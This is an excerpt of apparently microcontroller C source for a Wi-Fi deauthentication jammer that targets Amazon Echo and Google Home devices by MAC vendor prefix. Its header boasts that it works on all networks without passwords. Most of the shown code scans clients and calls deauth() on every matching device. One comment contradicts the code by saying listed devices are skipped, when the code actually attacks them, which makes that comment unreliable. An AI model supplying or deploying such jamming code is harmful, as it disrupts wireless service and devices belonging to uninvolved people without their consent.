/**
 * Jam the Wifi connection of all surrounding spy devices such as Amazon Echo and Google Home devices.
 * Beware that this automatically works on ALL Wifi networks (even hidden ones) without even knowing the wifi passwords.
 */
...
#define MAC_VEN_LEN 3
#define MAX_APS_TRACKED 100
#define MAX_CLIENTS_TRACKED 200

// Put Your devices here, system will skip them on deauth
#define SPY_VENDOR_LIST_LENGTH 2
uint8_t spy_vendor_list[SPY_VENDOR_LIST_LENGTH][MAC_VEN_LEN] = { 
  { 0x1C, 0x4D, 0x66 }, // "Amazon Technologies Inc." device (e.g. Amazon Echo / Alexa)
  { 0x48, 0xD6, 0xD5 }  // "Google, Inc." device (e.g. Google Home / OK Google)
};
...
bool is_spy_device(uint8_t *macAddress){
  unsigned int i=0;
  for (i=0; i<SPY_VENDOR_LIST_LENGTH; i++) {
    if (macAddress[0] == spy_vendor_list[i][0] && macAddress[1] == spy_vendor_list[i][1] && macAddress[2] == spy_vendor_list[i][2]) {
      return true;
    }
  }
  return false;
  /*if (macAddress >= 0x1C4D66000000 && macAddress < 0x1C4D67000000) { // Amazon device (e.g. Amazon Echo / Alexa)
    return true;
  } else if (macAddress >= 0x48D6D5000000 && macAddress < 0x48D6D6000000) { // Google device (e.g. Google Home / OK Google)
    return true;
  } else {
    return false;
  }*/
          ...
          if (aps_known[ua].channel == channel) {
            for (int uc = 0; uc < clients_known_count; uc++) {
              if (! memcmp(aps_known[ua].bssid, clients_known[uc].bssid, ETH_MAC_LEN)) {
                ...
                if (is_spy_device(address_to_check)) {
                  Serial.print("DeAuth to ---->");
                  print_client(clients_known[uc]);
                  deauth(clients_known[uc].station, clients_known[uc].bssid, clients_known[uc].seq_n);
                } else {
                  friendly_device_found = true;
                  Serial.print("Non-amazon device found -->");
                  print_client(clients_known[uc]);
                }
